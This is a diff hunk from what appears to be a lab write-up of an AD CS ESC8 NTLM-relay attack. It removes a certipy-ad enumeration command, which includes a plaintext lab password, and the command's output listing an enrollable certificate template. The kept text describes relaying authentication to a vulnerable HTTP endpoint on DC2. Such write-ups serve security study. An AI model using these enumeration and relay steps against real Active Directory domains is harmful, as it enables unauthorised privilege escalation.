@@ -612,48 +612,6 @@ https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/
 So there is a vulnerable HTTP endpoint on DC2 which i can use to relay authentication to!
 
 ```python
-certipy-ad find -u mike.silver@dismay.hsm -p 'Password123!' -dc-host dc1.dismay.hsm -stdout
-
-  31
-    Template Name                       : UserSignature
-    Display Name                        : User Signature Only
-    Enabled                             : False
-    Client Authentication               : True
-    Enrollment Agent                    : False
-    Any Purpose                         : False
-    Enrollee Supplies Subject           : False
-    Certificate Name Flag               : SubjectAltRequireUpn
-                                          SubjectAltRequireEmail
-                                          SubjectRequireEmail
-                                          SubjectRequireDirectoryPath
-    Enrollment Flag                     : AutoEnrollment
-    Extended Key Usage                  : Secure Email
-                                          Client Authentication
-    Requires Manager Approval           : False
-    Requires Key Archival               : False
-    Authorized Signatures Required      : 0
-    Schema Version                      : 1
-    Validity Period                     : 1 year
-    Renewal Period                      : 6 weeks
-    Minimum RSA Key Length              : 2048
-    Template Created                    : 2025-12-12T13:42:01+00:00
-    Template Last Modified              : 2025-12-12T13:42:16+00:00
-    Permissions
-      Enrollment Permissions
-        Enrollment Rights               : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Domain Users
-                                          DISMAY.HSM\Enterprise Admins
-      Object Control Permissions
-        Owner                           : DISMAY.HSM\Enterprise Admins
-        Full Control Principals         : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Enterprise Admins
-        Write Owner Principals          : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Enterprise Admins
-        Write Dacl Principals           : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Enterprise Admins
-        Write Property Enroll           : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Domain Users
-                                          DISMAY.HSM\Enterprise Admins
 
 ```
 So the next step was to find a valid template i can use, `UserSignature` should work since Domain users have enrollment rights
